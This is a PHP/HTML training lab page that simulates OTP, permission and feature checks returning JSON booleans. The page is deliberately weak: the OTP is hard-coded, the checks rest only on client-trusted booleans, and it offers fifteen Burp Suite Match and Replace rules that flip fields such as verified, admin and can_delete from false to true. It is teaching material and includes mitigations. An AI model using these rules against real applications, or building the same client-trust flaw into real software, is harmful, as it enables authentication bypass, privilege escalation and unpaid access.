<?php
// Lab 3: Boolean Value Manipulation
// Vulnerability: Boolean value manipulation vulnerabilities

session_start();

$message = '';
$response_data = [];

// Simulate boolean value manipulation
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    
    if ($action === 'check_verification') {
        $user_id = $_POST['user_id'] ?? '';
        $otp = $_POST['otp'] ?? '';
        
        if (!empty($user_id) && !empty($otp)) {
            // Simulate OTP verification
            $otp_valid = ($otp === '123456');
            
            $response_data = [
                'user_id' => $user_id,
                'otp' => $otp,
                'verified' => $otp_valid,
                'admin' => false,
                'premium' => false,
                'active' => $otp_valid,
                'message' => $otp_valid ? 'OTP verified successfully' : 'Invalid OTP',
                'timestamp' => date('Y-m-d H:i:s')
            ];
            
            $message = '<div class="alert alert-info">ℹ️ Response generated. Use Burp Suite to manipulate boolean values.</div>';
        } else {
            $message = '<div class="alert alert-warning">⚠️ Please provide user ID and OTP.</div>';
        }
    } elseif ($action === 'check_permissions') {
        $user_id = $_POST['user_id'] ?? '';
        $resource = $_POST['resource'] ?? '';
        
        if (!empty($user_id) && !empty($resource)) {
            // Simulate permission check
            $has_permission = ($user_id === 'admin' || $user_id === 'user1');
            
            $response_data = [
                'user_id' => $user_id,
                'resource' => $resource,
                'can_read' => $has_permission,
                'can_write' => ($user_id === 'admin'),
                'can_delete' => ($user_id === 'admin'),
                'can_admin' => ($user_id === 'admin'),
                'message' => $has_permission ? 'Permission granted' : 'Permission denied',
                'timestamp' => date('Y-m-d H:i:s')
            ];
            
            $message = '<div class="alert alert-info">ℹ️ Response generated. Use Burp Suite to manipulate boolean values.</div>';
        } else {
            $message = '<div class="alert alert-warning">⚠️ Please provide user ID and resource.</div>';
        }
    } elseif ($action === 'check_features') {
        $user_id = $_POST['user_id'] ?? '';
        $feature = $_POST['feature'] ?? '';
        
        if (!empty($user_id) && !empty($feature)) {
            // Simulate feature check
            $feature_enabled = ($user_id === 'admin' || $user_id === 'premium');
            
            $response_data = [
                'user_id' => $user_id,
                'feature' => $feature,
                'enabled' => $feature_enabled,
                'beta_access' => ($user_id === 'admin'),
                'premium_features' => ($user_id === 'admin' || $user_id === 'premium'),
                'advanced_tools' => ($user_id === 'admin'),
                'message' => $feature_enabled ? 'Feature enabled' : 'Feature disabled',
                'timestamp' => date('Y-m-d H:i:s')
            ];
            
            $message = '<div class="alert alert-info">ℹ️ Response generated. Use Burp Suite to manipulate boolean values.</div>';
        } else {
            $message = '<div class="alert alert-warning">⚠️ Please provide user ID and feature.</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 3: Boolean Value Manipulation - Response Manipulation Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .result-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .boolean-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }

        .vulnerable-form {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .response-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .response-item {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border: 1px solid #334155;
        }

        .boolean-rules {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }

        .rule-card {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            border: 1px solid #334155;
        }

        .rule-title {
            color: var(--accent-green);
            font-weight: 600;
            margin-bottom: 0.5rem;
        }

        .rule-demo {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 4px;
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }

        .status-false {
            color: var(--accent-red);
            font-weight: bold;
        }

        .status-true {
            color: var(--accent-green);
            font-weight: bold;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to Response Manipulation Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 3: Boolean Value Manipulation</h1>
            <p class="hero-subtitle">Boolean value manipulation vulnerabilities</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Low</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates boolean value manipulation vulnerabilities where attackers can use Burp Suite to modify boolean values in server responses and bypass security controls.</p>
            <p><strong>Objective:</strong> Understand how boolean value manipulation attacks work and how to exploit them using Burp Suite.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-toggle-on me-2"></i>Boolean Value Generator
                    </div>
                    <div class="card-body">
                        <div class="vulnerable-form">
                            <h5>OTP Verification</h5>
                            <p>Test OTP verification with boolean manipulation:</p>
                            
                            <form method="POST">
                                <input type="hidden" name="action" value="check_verification">
                                <div class="mb-3">
                                    <label for="user_id" class="form-label">User ID</label>
                                    <input type="text" class="form-control" id="user_id" name="user_id" placeholder="user123" required>
                                </div>
                                <div class="mb-3">
                                    <label for="otp" class="form-label">OTP</label>
                                    <input type="text" class="form-control" id="otp" name="otp" placeholder="123456" required>
                                </div>
                                <button type="submit" class="btn btn-primary">Verify OTP</button>
                            </form>
                            
                            <hr>
                            
                            <h5>Permission Check</h5>
                            <p>Test permissions with boolean manipulation:</p>
                            
                            <form method="POST">
                                <input type="hidden" name="action" value="check_permissions">
                                <div class="mb-3">
                                    <label for="user_id2" class="form-label">User ID</label>
                                    <input type="text" class="form-control" id="user_id2" name="user_id" placeholder="user123" required>
                                </div>
                                <div class="mb-3">
                                    <label for="resource" class="form-label">Resource</label>
                                    <input type="text" class="form-control" id="resource" name="resource" placeholder="admin_panel" required>
                                </div>
                                <button type="submit" class="btn btn-primary">Check Permissions</button>
                            </form>
                            
                            <hr>
                            
                            <h5>Feature Check</h5>
                            <p>Test features with boolean manipulation:</p>
                            
                            <form method="POST">
                                <input type="hidden" name="action" value="check_features">
                                <div class="mb-3">
                                    <label for="user_id3" class="form-label">User ID</label>
                                    <input type="text" class="form-control" id="user_id3" name="user_id" placeholder="user123" required>
                                </div>
                                <div class="mb-3">
                                    <label for="feature" class="form-label">Feature</label>
                                    <input type="text" class="form-control" id="feature" name="feature" placeholder="premium_feature" required>
                                </div>
                                <button type="submit" class="btn btn-primary">Check Feature</button>
                            </form>
                            
                            <?php echo $message; ?>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-shield-exclamation me-2"></i>Boolean Manipulation Tester
                    </div>
                    <div class="card-body">
                        <div class="boolean-warning">
                            <h5>⚠️ Boolean Manipulation Warning</h5>
                            <p>This lab demonstrates boolean value manipulation vulnerabilities:</p>
                            <ul>
                                <li><code>Boolean Values</code> - Manipulate true/false values</li>
                                <li><code>Verification Bypass</code> - Bypass verification checks</li>
                                <li><code>Permission Bypass</code> - Bypass permission checks</li>
                                <li><code>Feature Bypass</code> - Bypass feature checks</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Burp Suite Rules</h5>
                            <p>Use these Burp Suite Match and Replace rules:</p>
                            <ul>
                                <li><code>":false</code> → <code>":true</code></li>
                                <li><code>"verified":false</code> → <code>"verified":true</code></li>
                                <li><code>"admin":false</code> → <code>"admin":true</code></li>
                                <li><code>"enabled":false</code> → <code>"enabled":true</code></li>
                            </ul>
                        </div>
                        
                        <div class="mt-3">
                            <button onclick="testBooleanManipulation()" class="btn btn-primary">Test Boolean Manipulation</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <?php if (!empty($response_data)): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Generated Response
                    </div>
                    <div class="card-body">
                        <div class="response-display">
                            <h5>Server Response (JSON):</h5>
                            <pre><?php echo json_encode($response_data, JSON_PRETTY_PRINT); ?></pre>
                            
                            <h5>Response Analysis:</h5>
                            <div class="response-item">
                                <div class="row align-items-center">
                                    <div class="col-md-3">
                                        <strong>Verified:</strong> <span class="status-<?php echo isset($response_data['verified']) && $response_data['verified'] ? 'true' : 'false'; ?>"><?php echo isset($response_data['verified']) ? ($response_data['verified'] ? 'true' : 'false') : 'N/A'; ?></span>
                                    </div>
                                    <div class="col-md-3">
                                        <strong>Admin:</strong> <span class="status-<?php echo isset($response_data['admin']) && $response_data['admin'] ? 'true' : 'false'; ?>"><?php echo isset($response_data['admin']) ? ($response_data['admin'] ? 'true' : 'false') : 'N/A'; ?></span>
                                    </div>
                                    <div class="col-md-3">
                                        <strong>Enabled:</strong> <span class="status-<?php echo isset($response_data['enabled']) && $response_data['enabled'] ? 'true' : 'false'; ?>"><?php echo isset($response_data['enabled']) ? ($response_data['enabled'] ? 'true' : 'false') : 'N/A'; ?></span>
                                    </div>
                                    <div class="col-md-3">
                                        <strong>Active:</strong> <span class="status-<?php echo isset($response_data['active']) && $response_data['active'] ? 'true' : 'false'; ?>"><?php echo isset($response_data['active']) ? ($response_data['active'] ? 'true' : 'false') : 'N/A'; ?></span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Boolean Value Manipulation Rules
                    </div>
                    <div class="card-body">
                        <div class="boolean-rules">
                            <div class="rule-card">
                                <div class="rule-title">General Boolean Manipulation</div>
                                <div class="rule-demo">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\":false",
  "string_replace": "\":true"
}</div>
                            </div>
                            
                            <div class="rule-card">
                                <div class="rule-title">Verification Bypass</div>
                                <div class="rule-demo">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"verified\":false",
  "string_replace": "\"verified\":true"
}</div>
                            </div>
                            
                            <div class="rule-card">
                                <div class="rule-title">Admin Privilege Escalation</div>
                                <div class="rule-demo">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"admin\":false",
  "string_replace": "\"admin\":true"
}</div>
                            </div>
                            
                            <div class="rule-card">
                                <div class="rule-title">Feature Enablement</div>
                                <div class="rule-demo">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"enabled\":false",
  "string_replace": "\"enabled\":true"
}</div>
                            </div>
                            
                            <div class="rule-card">
                                <div class="rule-title">Premium Access</div>
                                <div class="rule-demo">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"premium\":false",
  "string_replace": "\"premium\":true"
}</div>
                            </div>
                            
                            <div class="rule-card">
                                <div class="rule-title">Active Status</div>
                                <div class="rule-demo">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"active\":false",
  "string_replace": "\"active\":true"
}</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Boolean Value Manipulation</li>
                        <li><strong>Severity:</strong> Medium</li>
                        <li><strong>Method:</strong> Burp Suite Match and Replace</li>
                        <li><strong>Issue:</strong> Client-side trust of boolean values</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>Verification Bypass:</strong> Change false to true</li>
                        <li><strong>Permission Escalation:</strong> Escalate permissions</li>
                        <li><strong>Feature Bypass:</strong> Enable disabled features</li>
                        <li><strong>Status Manipulation:</strong> Change status values</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Boolean Value Manipulation Examples</h5>
            <p>Use these Burp Suite Match and Replace rules to exploit boolean value manipulation vulnerabilities:</p>
            
            <h6>1. General Boolean Manipulation:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\":false",
  "string_replace": "\":true"
}

// This rule changes all false values to true
// Example: "verified":false becomes "verified":true</div>

            <h6>2. Verification Bypass:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"verified\":false",
  "string_replace": "\"verified\":true"
}

// This rule bypasses verification checks
// Example: "verified":false becomes "verified":true</div>

            <h6>3. Admin Privilege Escalation:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"admin\":false",
  "string_replace": "\"admin\":true"
}

// This rule escalates user to admin
// Example: "admin":false becomes "admin":true</div>

            <h6>4. Feature Enablement:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"enabled\":false",
  "string_replace": "\"enabled\":true"
}

// This rule enables disabled features
// Example: "enabled":false becomes "enabled":true</div>

            <h6>5. Premium Access:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"premium\":false",
  "string_replace": "\"premium\":true"
}

// This rule grants premium access
// Example: "premium":false becomes "premium":true</div>

            <h6>6. Active Status:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"active\":false",
  "string_replace": "\"active\":true"
}

// This rule activates inactive accounts
// Example: "active":false becomes "active":true</div>

            <h6>7. Permission Escalation:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"can_write\":false",
  "string_replace": "\"can_write\":true"
}

// This rule grants write permissions
// Example: "can_write":false becomes "can_write":true</div>

            <h6>8. Delete Permission:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"can_delete\":false",
  "string_replace": "\"can_delete\":true"
}

// This rule grants delete permissions
// Example: "can_delete":false becomes "can_delete":true</div>

            <h6>9. Admin Permission:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"can_admin\":false",
  "string_replace": "\"can_admin\":true"
}

// This rule grants admin permissions
// Example: "can_admin":false becomes "can_admin":true</div>

            <h6>10. Beta Access:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"beta_access\":false",
  "string_replace": "\"beta_access\":true"
}

// This rule grants beta access
// Example: "beta_access":false becomes "beta_access":true</div>

            <h6>11. Premium Features:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"premium_features\":false",
  "string_replace": "\"premium_features\":true"
}

// This rule enables premium features
// Example: "premium_features":false becomes "premium_features":true</div>

            <h6>12. Advanced Tools:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"advanced_tools\":false",
  "string_replace": "\"advanced_tools\":true"
}

// This rule enables advanced tools
// Example: "advanced_tools":false becomes "advanced_tools":true</div>

            <h6>13. Email Verified:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"email_verified\":false",
  "string_replace": "\"email_verified\":true"
}

// This rule bypasses email verification
// Example: "email_verified":false becomes "email_verified":true</div>

            <h6>14. Phone Verified:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"phone_verified\":false",
  "string_replace": "\"phone_verified\":true"
}

// This rule bypasses phone verification
// Example: "phone_verified":false becomes "phone_verified":true</div>

            <h6>15. Account Verified:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"account_verified\":false",
  "string_replace": "\"account_verified\":true"
}

// This rule bypasses account verification
// Example: "account_verified":false becomes "account_verified":true</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Complete verification and authentication bypass</li>
                <li>Unauthorized access and privilege escalation</li>
                <li>Premium feature access without payment</li>
                <li>Compliance violations and legal issues</li>
                <li>Data manipulation and integrity issues</li>
                <li>Business process disruption and operational impact</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement server-side validation and verification</li>
                    <li>Use response integrity checks and signatures</li>
                    <li>Implement proper authentication and authorization</li>
                    <li>Use secure coding practices</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual response patterns</li>
                    <li>Implement proper input validation</li>
                    <li>Use secure session management</li>
                    <li>Implement proper error handling</li>
                    <li>Educate users about security threats</li>
                    <li>Use multi-factor authentication</li>
                    <li>Implement proper logging and monitoring</li>
                    <li>Use boolean manipulation detection tools</li>
                    <li>Implement proper audit trails</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function testBooleanManipulation() {
            alert('Boolean Value Manipulation test initiated. Use Burp Suite Match and Replace rules above.');
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
